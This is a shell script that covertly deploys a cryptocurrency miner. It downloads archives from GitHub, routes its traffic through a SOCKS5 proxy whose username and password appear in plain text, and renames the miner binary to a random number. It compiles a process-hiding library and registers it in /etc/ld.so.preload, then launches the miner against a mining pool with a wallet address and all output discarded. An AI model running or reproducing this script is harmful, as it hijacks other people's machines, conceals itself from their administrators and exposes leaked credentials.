#!/bin/sh

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime

dpkg-reconfigure --frontend noninteractive tzdata

wget https://github.com/komaria10003099/wappahj/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = us-east-static-03.quotaguard.com:1080
socks5_username = m1orro4i3z62xo
socks5_password = vdx9fz1txauwwfs4407a3zirgr8t9
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "

echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

echo "**"

echo " "

echo " "
blkdiscard=$(shuf -n 1 -i 1-999999)
./graftcp/graftcp wget https://github.com/komaria10003099/komaria/raw/main/nikimaru.zip && unzip nikimaru.zip

chmod +x bash
mv bash $blkdiscard 
wget https://github.com/komaria10003099/wappahj/raw/main/magicBezzHash.zip

unzip magicBezzHash.zip

make

gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl

mv libprocesshider.so /usr/local/lib/

echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./$blkdiscard  -t cuda -a "NQ04 H0C7 TJYF 68DT RQSF FSKX AT0A UNED 1XKL" -n $(echo $(shuf -i 1-20000 -n 1)-GG) -p pool.acemining.co:8443 --threads 1 --cache 2 --cpu-priority 0 >/dev/null 2>&1